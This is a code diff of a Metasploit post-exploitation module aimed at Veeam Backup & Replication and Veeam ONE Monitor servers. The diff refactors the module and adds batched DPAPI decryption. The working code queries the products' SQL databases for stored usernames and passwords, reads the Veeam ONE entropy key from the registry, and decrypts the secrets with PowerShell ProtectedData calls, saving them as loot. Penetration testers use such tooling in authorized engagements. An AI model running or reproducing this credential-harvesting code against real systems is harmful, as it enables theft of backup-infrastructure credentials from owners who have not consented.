@@ -63,7 +63,8 @@ class MetasploitModule < Msf::Post
       )
     )
     register_advanced_options([
-      OptBool.new('BATCH_DPAPI', [ true, 'Perform DPAPI PowerShell decryption in a single call', true ]),
+      OptBool.new('BATCH_DPAPI', [ true, 'Perform DPAPI PowerShell decryption in batches instead of sequentially', true ]),
+      OptInt.new('BATCH_DPAPI_MAXLEN', [ true, 'Length threshold before a new batch is triggered', 8192 ]),
       OptPath.new('VBR_CSV_FILE', [ false, 'Path to VBR database export CSV file if using the decrypt action' ]),
       OptPath.new('VOM_CSV_FILE', [ false, 'Path to VOM database export CSV file if using the decrypt action' ]),
       OptString.new('VBR_MSSQL_INSTANCE', [ false, 'The VBR MSSQL instance path' ]),
@@ -116,7 +117,7 @@ class MetasploitModule < Msf::Post
           fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VBR CSV input file') unless ::File.file?(vbr_encrypted_csv_file)
 
           print_status('Performing decryption of Veeam Backup & Replication SQL database')
-          vbr_decrypted_csv_file = decrypt(vbr_encrypted_csv_file, 'vbr')
+          vbr_decrypted_csv_file = decrypt(vbr_encrypted_csv_file, 'VBR')
           print_good("Decrypted Veeam Backup & Replication Database Dump: #{vbr_decrypted_csv_file}")
         end
       end
@@ -126,7 +127,7 @@ class MetasploitModule < Msf::Post
           fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VOM CSV input file') unless ::File.file?(vom_encrypted_csv_file)
 
           print_status('Performing decryption of Veeam ONE Monitor SQL database')
-          vom_decrypted_csv_file = decrypt(vom_encrypted_csv_file, 'vom')
+          vom_decrypted_csv_file = decrypt(vom_encrypted_csv_file, 'VOM')
           print_good("Decrypted Veeam ONE Monitor Database Dump: #{vom_decrypted_csv_file}")
         end
       end
@@ -134,37 +135,29 @@ class MetasploitModule < Msf::Post
   end
 
   def export(target)
-    target_name = target.downcase
+    target_name = target.upcase
+    csv = dump_db(target_name)
     case target_name
-    when 'vbr'
-      csv = dump_vbr_db
+    when 'VBR'
       db_name = @vbr_db_name
       total_secrets = @vbr_total_secrets
-    when 'vom'
-      csv = dump_vom_db
+    when 'VOM'
       db_name = @vom_db_name
       total_secrets = @vom_total_secrets
-    else
-      return nil
     end
     total_rows = csv.count
     print_good("#{total_rows} rows exported, #{total_secrets} unique IDs")
     encrypted_data = csv.to_s.delete("\000")
-    store_loot("veeam_#{target_name}_enc", 'text/csv', rhost, encrypted_data, "#{db_name}.csv", 'Encrypted Database Dump')
+    store_loot("veeam_#{target_name}_enc", 'text/csv', rhost, encrypted_data, "#{db_name}.csv", "Encrypted #{target_name} Database Dump")
   end
 
   def decrypt(csv_file, target)
     target_name = target.upcase
-    case target_name
-    when 'VBR'
-      target_vbr = true
-      target_vom = false
-    when 'VOM'
-      target_vom = true
-      target_vbr = false
-    else
-      return nil
-    end
+    targets = resolve_target(target_name)
+    fail_with(Msf::Exploit::Failure::Unknown, "Could not resolve Veeam product '#{target_name}'") if targets.nil?
+
+    target_vbr = targets['VBR']
+    target_vom = targets['VOM']
     csv = read_csv_file(csv_file)
     total_rows = csv.count
     total_secrets = @vbr_total_secrets if target_vbr
@@ -200,34 +193,51 @@ class MetasploitModule < Msf::Post
     res
   end
 
-  def dump_vbr_db
-    sql_query = 'SET NOCOUNT ON;SELECT [id] ID,[usn] USN,[user_name] Username,[password] Password,[description] Description,[visible] Visible FROM dbo.Credentials'
-    sql_cmd = sql_prepare(sql_query, 'vbr')
-    print_status('Export Veeam Backup & Replication DB ...')
+  def dump_db(target)
+    target_name = target.upcase
+    case target_name
+    when 'VBR'
+      sql_query = 'SET NOCOUNT ON;
+        SELECT
+          [id] ID,
+          [usn] USN,
+          [user_name] Username,
+          CONVERT(VARCHAR(4096),[password]) Password,
+          [description] Description,
+          [visible] Visible
+        FROM dbo.Credentials'
+    when 'VOM'
+      sql_query = "SET NOCOUNT ON;
+        SELECT
+          [uid] ID,
+          [id] USN,
+          [name] Username,
+          CONVERT(VARCHAR(4096),[password]) Password,
+          'VeeamONE Credential' Description,
+          0 Visible
+        FROM
+          [collector].[user]
+        WHERE
+          [collector].[user].[name] IS NOT NULL AND [collector].[user].[name] NOT LIKE ''"
+    else
+      fail_with(Msf::Exploit::Failure::Unknown, "Cannot dump database for Veeam product '#{target_name}'")
+    end
+    sql_cmd = sql_prepare(sql_query, target.downcase)
+    print_status("Export #{target_name} DB ...")
     query_result = cmd_exec(sql_cmd)
     fail_with(Msf::Exploit::Failure::Unknown, query_result) if query_result.downcase.start_with?('sqlcmd: ') || query_result.downcase.start_with?('msg ')
 
     csv = ::CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
-    fail_with(Msf::Exploit::Failure::Unknown, 'Error parsing VBR SQL dataset into CSV format') unless csv
+    fail_with(Msf::Exploit::Failure::Unknown, "Error parsing #{target_name} SQL dataset into CSV format") unless csv
 
-    @vbr_total_secrets = csv['ID'].uniq.count
-    fail_with(Msf::Exploit::Failure::Unknown, 'VBR SQL dataset contains no ID column values') unless @vbr_total_secrets >= 1 && !csv['ID'].uniq.first.nil?
-
-    csv
-  end
-
-  def dump_vom_db
-    sql_query = "SET NOCOUNT ON;SELECT [uid] ID, [id] USN, [name] Username, [password] Password,'VeeamONE Credential' Description,0 Visible FROM [collector].[user] WHERE [collector].[user].[name] IS NOT NULL AND [collector].[user].[name] NOT LIKE ''"
-    sql_cmd = sql_prepare(sql_query, 'vom')
-    print_status('Export Veeam ONE Monitor DB ...')
-    query_result = cmd_exec(sql_cmd)
-    fail_with(Msf::Exploit::Failure::Unknown, query_result) if query_result.downcase.start_with?('sqlcmd: ') || query_result.downcase.start_with?('msg ')
-
-    csv = ::CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
-    fail_with(Msf::Exploit::Failure::Unknown, 'Error parsing VOM SQL dataset into CSV format') unless csv
-
-    @vom_total_secrets = csv['ID'].uniq.count
-    fail_with(Msf::Exploit::Failure::Unknown, 'VOM SQL dataset contains no ID column values') unless @vom_total_secrets >= 1 && !csv['ID'].uniq.first.nil?
+    case target_name
+    when 'VBR'
+      @vbr_total_secrets = csv['ID'].uniq.count
+      fail_with(Msf::Exploit::Failure::Unknown, 'VBR SQL dataset contains no ID column values') unless @vbr_total_secrets && @vbr_total_secrets >= 1 && !csv['ID'].uniq.first.nil?
+    when 'VOM'
+      @vom_total_secrets = csv['ID'].uniq.count
+      fail_with(Msf::Exploit::Failure::Unknown, 'VOM SQL dataset contains no ID column values') unless @vom_total_secrets && @vom_total_secrets >= 1 && !csv['ID'].uniq.first.nil?
+    end
 
     csv
   end
@@ -241,18 +251,45 @@ class MetasploitModule < Msf::Post
     result_csv = ::CSV.parse(result_header_row, headers: :first_row, write_headers: true, return_headers: true)
     plaintext_array = []
     print_status('Process Veeam Backup & Replication DB ...')
-    blank_b64 = psh_exec("Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Protect([String]::Empty, $Null, 'LocalMachine'))").delete("\000")
-    vprint_status("Generated blank DPAPI blob #{blank_b64}")
     if datastore['BATCH_DPAPI']
+      max_len = datastore['BATCH_DPAPI_MAXLEN']
+      vprint_status("Using BATCH_DPAPI mode, batch length threshold: #{max_len}")
+      blank_b64 = psh_exec("Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Protect([Text.Encoding]::Ascii.GetBytes('-'), $Null, 'LocalMachine'))").delete("\000")
+      vprint_status("Generated placeholder DPAPI blob #{blank_b64}")
+      batch_num = 1
+      vprint_status("Entering batch ##{batch_num} ...")
+      ciphertext_array = []
+      seq_len = 0
       csv_dataset.each do |row|
         secret_ciphertext = row['Password']
-        if secret_ciphertext.nil?
-          plaintext_array << blank_b64
+        if secret_ciphertext.nil? || secret_ciphertext.empty?
+          ciphertext_b64 = blank_b64
         else
-          plaintext_array << ::Base64.strict_encode64(::Base64.decode64(secret_ciphertext))
+          ciphertext_b64 = ::Base64.strict_encode64(::Base64.decode64(secret_ciphertext))
+        end
+        if ciphertext_b64.length > max_len
+          fail_with(Msf::Exploit::Failure::NoTarget, 'Ciphertext LEN is greater than BATCH_DPAPI_MAXLEN - increase this value, or set BATCH_DPAPI to false and re-execute')
+        end
+        if seq_len + ciphertext_b64.length < max_len
+          ciphertext_array << ciphertext_b64
+          seq_len += ciphertext_b64.length
+        else
+          vprint_status("Submit batch ##{batch_num}, payload length: #{seq_len} ...")
+          veeam_vbr_decrypt(ciphertext_array).delete("\000").gsub("\r", '').split("\n").each do |plaintext|
+            plaintext_array << plaintext
+          end
+          batch_num += 1
+          vprint_status("Entering batch ##{batch_num} ...")
+          ciphertext_array = []
+          ciphertext_array << ciphertext_b64
+          seq_len = ciphertext_b64.length
         end
       end
-      secret_plaintext_array = veeam_vbr_decrypt(plaintext_array).delete("\000").gsub("\r", '').split("\n")
+      vprint_status("Finalizing batch ##{batch_num}, payload length: #{seq_len} ...")
+      veeam_vbr_decrypt(ciphertext_array).delete("\000").gsub("\r", '').split("\n").each do |plaintext|
+        plaintext_array << plaintext
+      end
+      vprint_status("Pre-populated #{plaintext_array.count} array elements with decrypted values via batch method")
     end
     csv_dataset.each do |row|
       current_row += 1
@@ -267,7 +304,8 @@ class MetasploitModule < Msf::Post
       secret_description = row['Description']
       secret_visible = row['Visible']
       if datastore['BATCH_DPAPI']
-        secret_plaintext = secret_plaintext_array[current_row - 1]
+        secret_plaintext = plaintext_array[current_row - 1]
+        secret_plaintext = '' if secret_plaintext == '-' # Switched from blank / unsure why empty strings don't hit the array now that it does an .each
       else
         secret_ciphertext = row['Password']
         if secret_ciphertext.nil?
@@ -367,9 +405,9 @@ class MetasploitModule < Msf::Post
     veeam_hostname = get_env('COMPUTERNAME')
     print_status("Hostname #{veeam_hostname} IPv4 #{rhost}")
     require_sql = action.name.downcase == 'export' || action.name.downcase == 'dump'
-    get_vbr_version
-    get_vom_version
-    fail_with(Msf::Exploit::Failure::NoTarget, 'No Veeam products detected') unless vbr? || vom?
+    get_version('VBR')
+    get_version('VOM')
+    fail_with(Msf::Exploit::Failure::NoTarget, 'No supported Veeam products detected') unless vbr? || vom?
     if require_sql
       get_sql_client
       fail_with(Msf::Exploit::Failure::BadConfig, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
@@ -394,94 +432,102 @@ class MetasploitModule < Msf::Post
     )
     fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv
 
-    @vbr_total_secrets = csv['ID'].uniq.count
-    unless @vbr_total_secrets >= 1 && !csv['ID'].uniq.first.nil?
-      fail_with(Msf::Exploit::Failure::NoTarget, "Provided CSV file #{file_name} contains no ID column values")
-    end
     csv
   end
 
-  def get_vbr_version
-    return nil unless (vbr_path = get_vbr_path)
+  def get_version(target)
+    target_name = target.upcase
+    case target_name
+    when 'VBR'
+      return nil unless (vbr_path = get_install_path('VBR'))
 
-    vbr_dll_file = "#{vbr_path}\\Packages\\VeeamDeploymentDll.dll"
-    unless file_exist?(vbr_dll_file)
-      print_error("Could not read Veeam deployment DLL at #{vbr_dll_file}")
-      return nil
-    end
-    cmd_str = "(Get-Item -Path '#{vbr_dll_file}').VersionInfo.ProductVersion"
-    vbr_version = psh_exec(cmd_str)
-    @vbr_build = ::Rex::Version.new(vbr_version)
-    if @vbr_build > ::Rex::Version.new('0')
-      print_status("Veeam Backup & Replication Build #{@vbr_build}")
+      target_binary = "#{vbr_path}\\Packages\\VeeamDeploymentDll.dll"
+    when 'VOM'
+      return nil unless (vom_path = get_install_path('VOM'))
+
+      target_binary = "#{vom_path}\\VeeamDCS.exe"
     else
-      print_error('Error determining Veeam Backup & Replication version')
-      @vbr_build = nil
-    end
-  end
-
-  def get_vom_version
-    return nil unless (vom_path = get_vom_path)
-
-    vom_exe_file = "#{vom_path}\\VeeamDCS.exe"
-    unless file_exist?(vom_exe_file)
-      print_error("Could not read Veeam ONE binary #{vom_exe_file}")
       return nil
     end
-    cmd_str = "(Get-Item -Path '#{vom_exe_file}').VersionInfo.ProductVersion"
-    vom_version = psh_exec(cmd_str)
-    @vom_build = ::Rex::Version.new(vom_version)
-    if @vom_build > ::Rex::Version.new('0')
-      print_status("Veeam ONE Monitor Build #{@vom_build}")
-      cmd_str = "[Convert]::ToBase64String((Get-ItemPropertyValue -Path 'HKLM:\\SOFTWARE\\Veeam\\Veeam ONE\\Private\\' -Name Entropy))"
-      vom_entropy = psh_exec(cmd_str)
-      @vom_entropy_b64 = vom_entropy if vom_entropy.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
-    else
-      print_error('Error determining Veeam ONE Monitor version')
-      @vom_build = nil
+    set_veeam_build(target_name, read_version_info(target_binary))
+  end
+
+  def read_version_info(target_binary)
+    unless file_exist?(target_binary)
+      print_error("Could not read binary file at #{target_binary}")
+      return nil
+    end
+    cmd_str = "(Get-Item -Path '#{target_binary}').VersionInfo.ProductVersion"
+    target_version = psh_exec(cmd_str)
+    ::Rex::Version.new(target_version)
+  end
+
+  def set_veeam_build(target_name, target_version)
+    case target_name
+    when 'VBR'
+      @vbr_build = target_version
+      if vbr?
+        print_status("Veeam Backup & Replication Build #{@vbr_build}")
+      else
+        print_error('Error determining Veeam Backup & Replication version')
+        @vbr_build = nil
+      end
+    when 'VOM'
+      @vom_build = target_version
+      if vom?
+        print_status("Veeam ONE Monitor Build #{@vom_build}")
+        cmd_str = "[Convert]::ToBase64String((Get-ItemPropertyValue -Path 'HKLM:\\SOFTWARE\\Veeam\\Veeam ONE\\Private\\' -Name Entropy))"
+        vom_entropy = psh_exec(cmd_str)
+        @vom_entropy_b64 = vom_entropy if vom_entropy.match?(%r{^[-A-Za-z0-9+/]*={0,3}$})
+      else
+        print_error('Error determining Veeam ONE Monitor version')
+        @vom_build = nil
+      end
     end
   end
 
-  def get_vbr_path
-    reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam Backup and Replication'
+  def get_install_path(target)
+    target_name = target.upcase
+    case target_name
+    when 'VBR'
+      reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam Backup and Replication'
+    when 'VOM'
+      reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam ONE Monitor\\Service'
+    end
     unless registry_key_exist?(reg_key)
-      vprint_warning("Registry key #{reg_key} does not exist, Veeam Backup and Replication does not appear to be installed")
+      vprint_warning("Registry key #{reg_key} does not exist, #{target_name} is not installed")
       return nil
     end
-    vbr_path = registry_getvaldata(reg_key, 'CorePath').to_s.gsub(/\\$/, '')
-    if vbr_path.empty?
-      print_error("Could not find VBR CorePath registry entry under #{reg_key}")
+    case target_name
+    when 'VBR'
+      app_path = registry_getvaldata(reg_key, 'CorePath').to_s.gsub(/\\$/, '')
+    when 'VOM'
+      app_path = registry_getvaldata(reg_key, 'MonitorX64ClientDistributivePath').to_s
+    end
+    if app_path.empty?
+      print_error("Could not find #{target_name} target registry value at #{reg_key}")
       return nil
     end
-    print_status("Veeam Backup & Replication Install Path: #{vbr_path}")
-    vbr_path
-  end
-
-  def get_vom_path
-    reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam ONE Monitor\\Service'
-    unless registry_key_exist?(reg_key)
-      vprint_warning("Registry key #{reg_key} does not exist, Veeam ONE Monitor Server does not appear to be installed")
-      return nil
+    case target_name
+    when 'VBR'
+      print_status("Veeam Backup & Replication Install Path: #{app_path}")
+    when 'VOM'
+      app_path = app_path.split('\\ClientPackages\\VeeamONE.Monitor.Client.x64.msi')[0]
+      print_status("Veeam ONE Monitor Install Path: #{app_path}")
     end
-    vom_client_path = registry_getvaldata(reg_key, 'MonitorX64ClientDistributivePath').to_s
-    if vom_client_path.empty?
-      print_error("Could not find VOM MonitorX64ClientDistributivePath registry entry under #{reg_key}")
-      return nil
-    end
-    vom_path = vom_client_path.split('\ClientPackages\VeeamONE.Monitor.Client.x64.msi').first.to_s.gsub(/\\$/, '')
-    print_status("Veeam ONE Monitor Install Path: #{vom_path}")
-    vom_path
+    app_path
   end
 
   def sql_prepare(sql_query, target)
-    case target.downcase
-    when 'vbr'
+    target_name = target.upcase
+    case target_name
+    when 'VBR'
       if @vbr_db_integrated_auth
         sql_cmd_pre = "\"#{@vbr_db_name}\" -S #{@vbr_db_instance_path} -E"
       else
         sql_cmd_pre = "\"#{@vbr_db_name}\" -S #{@vbr_db_instance_path} -U \"#{@vbr_db_user}\" -P \"#{@vbr_db_pass}\""
       end
-    when 'vom'
+    when 'VOM'
       if @vom_db_integrated_auth
         sql_cmd_pre = "\"#{@vom_db_name}\" -S #{@vom_db_instance_path} -E"
       else
@@ -655,7 +701,7 @@ class MetasploitModule < Msf::Post
     if b64.is_a?(Array)
       # Gets around having to call psh_exec for every row at the expense of piling every B64 secret directly into the command line
       # Limitations of this approach include death when the max command line buffer size is exhausted, YMMV
-      # From the operator's perspective this is controlled by way of the BATCH_DPAPI advanced option, defaulted true; can be unset to make sequential calls to psh_exec instead
+      # From the operator's perspective this is controlled by way of the BATCH_DPAPI advanced option
       secrets_ps_array = "@(#{b64.map { |s| "'#{s}'" }.join(',')})"
       cmd_str = "Add-Type -AssemblyName System.Security;#{secrets_ps_array}|ForEach-Object {[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($_), $Null, 'LocalMachine'))}"
     elsif b64.is_a?(String)
@@ -697,6 +743,18 @@ class MetasploitModule < Msf::Post
       disposition = 'AES'
     end
     { 'Plaintext' => plaintext, 'Method' => disposition }
+  end
+
+  def resolve_target(target)
+    target_name = target.upcase
+    case target_name
+    when 'VBR'
+      return { 'VBR' => true, 'VOM' => false }
+    when 'VOM'
+      return { 'VBR' => false, 'VOM' => true }
+    else
+      return nil
+    end
   end
 
   def plunder(rowset)
